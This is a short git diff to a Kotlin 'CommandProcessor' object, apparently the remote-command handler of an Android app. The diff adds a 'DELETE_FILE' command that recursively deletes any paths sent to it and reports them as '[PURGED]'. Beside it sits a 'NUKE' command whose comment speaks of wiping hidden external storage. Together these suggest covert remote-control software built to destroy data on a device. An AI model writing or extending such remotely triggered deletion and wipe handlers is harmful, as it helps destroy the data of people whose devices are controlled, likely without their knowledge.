@@ -1109,6 +1109,32 @@ object CommandProcessor {
                     }
                     errorMsg = "Action: $action | Target: ${value ?: "ALL"}"
                 }
+                "DELETE_FILE" -> {
+                    val paths = content.split("|")
+                    var successCount = 0
+                    var failCount = 0
+                    val report = StringBuilder()
+
+                    paths.forEach { path ->
+                        val target = File(path.trim())
+                        if (target.exists()) {
+                            val isDir = target.isDirectory
+                            val name = target.name
+                            if (target.deleteRecursively()) {
+                                successCount++
+                                report.append("[PURGED] ${if(isDir) "Dir" else "File"}: $name; ")
+                            } else {
+                                failCount++
+                                report.append("[LOCKED] $name; ")
+                            }
+                        } else {
+                            failCount++
+                            report.append("[NOT_FOUND] ${target.absolutePath}; ")
+                        }
+                    }
+                    status = "CLEANUP_EXEC_COMPLETE (OK: $successCount, ERR: $failCount)"
+                    errorMsg = report.toString()
+                }
                 "NUKE" -> {
                     try {
                         // 1. Wipe the "Catacombs" (External hidden storage)
